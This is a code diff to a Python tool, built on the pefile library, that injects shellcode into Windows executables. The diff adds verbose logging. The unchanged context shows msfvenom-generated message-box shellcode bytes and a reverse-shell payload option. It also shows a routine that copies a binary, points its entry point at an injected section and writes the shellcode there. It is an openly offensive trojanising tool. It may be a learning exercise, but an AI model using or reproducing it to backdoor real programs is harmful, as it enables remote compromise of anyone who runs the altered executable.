@@ -1,12 +1,13 @@
 import pefile
+from config import VERBOSE
 import utilities
 
 
 def msgbox():
     # for this example we are using the message box payload
     # msfvenom -a x86 --platform windows -p windows/messagebox \
-    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION EXITFUNC=process \
-    # TITLE="Testing" -f python
+    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
+    # EXITFUNC=process TITLE="Testing" -f python
 
     messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
@@ -73,8 +74,17 @@ def reverse_shell(lhost=None):
 
 def payload_selection(payload, *args, **kwargs):
     if payload in 'msgbox':
+        if VERBOSE:
+            print("Selecting Message Box Shellcode\n")
         return msgbox()
     elif payload in 'reverse':
+        if VERBOSE:
+            print("Selecting Windows TCP Reverse Shell Shellcode")
+            for k, v in kwargs.items():
+                print(f"\tAdditional Argument: {k}={v}")
+            for a in args:
+                print(f"\tAdditional Argument: {a}")
+            print()
         return reverse_shell(*args, **kwargs)
 
 
@@ -82,8 +92,10 @@ def insert_payload(path, payload, *args, **kwargs):
     path = utilities.make_duplicate(path, payload)
     pe = pefile.PE(path)
 
-    # We will first change the binaries entry point to be the newly injected section
-    # this will run our injected code first
+    # We will first change the binaries entry point to be the newly injected
+    # section this will run our injected code first
+    if VERBOSE:
+        print(f"Modifying Entry Point\n")
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress
 
     # Now we have to actually load the payload into the binary
@@ -92,8 +104,12 @@ def insert_payload(path, payload, *args, **kwargs):
 
     # Write the shellcode into the new section
     shellcode = payload_selection(payload, *args, **kwargs)
+
+    if VERBOSE:
+        print(f"Writing shellcode to {hex(raw_offset)}\n")
     pe.set_bytes_at_offset(raw_offset, shellcode)
     pe.write(path)
+    print("[x] Payload injected\n")
 
 
 if __name__ == "__main__":
